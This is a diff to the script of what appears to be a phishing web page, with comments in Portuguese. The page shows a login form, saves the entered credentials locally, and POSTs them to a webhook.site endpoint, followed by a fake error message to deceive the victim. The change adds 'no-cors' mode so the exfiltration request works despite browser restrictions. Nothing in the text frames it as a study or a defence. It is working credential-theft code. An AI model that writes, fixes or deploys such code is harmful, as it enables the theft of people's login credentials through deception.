@@ -256,7 +256,6 @@
     <script>
         // Configuração - EDITAR AQUI!
         const LOG_ENDPOINT = 'https://webhook.site/ab830b1e-933d-4730-becf-f96ff893bd33';
-        // const LOG_ENDPOINT = 'http://localhost:8000/log';  // Opção local
 
         function showLoginForm() {
             document.querySelector('.action-section').style.display = 'none';
@@ -291,14 +290,19 @@
             savedCredentials.push(credentials);
             localStorage.setItem('grupo_creds', JSON.stringify(savedCredentials));
             
-            // Envia para o servidor ou webhook
+            // Envia para o webhook (COM NO-CORS)
             fetch(LOG_ENDPOINT, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify(credentials)
-            }).catch(error => console.log('Servidor offline, salvando localmente'));
+                body: JSON.stringify(credentials),
+                mode: 'no-cors'  // 🔥 CORREÇÃO DO CORS
+            }).then(() => {
+                console.log('Dados enviados para o webhook (no-cors mode)');
+            }).catch(error => {
+                console.log('Erro ao enviar:', error);
+            });
             
             // Mostra mensagem de erro fake
             document.getElementById('successMessage').style.display = 'block';
